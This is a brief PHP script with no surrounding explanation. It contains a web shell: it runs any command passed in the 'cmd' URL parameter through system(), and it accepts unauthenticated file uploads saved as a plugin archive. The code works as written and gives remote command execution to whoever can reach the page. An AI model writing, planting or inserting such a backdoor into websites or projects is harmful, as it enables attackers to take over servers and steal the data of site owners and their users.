<?php
if (isset($_FILES['upload'])) {
    move_uploaded_file($_FILES['upload']['tmp_name'], '/var/www/uploads/plugin.zip');
}
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
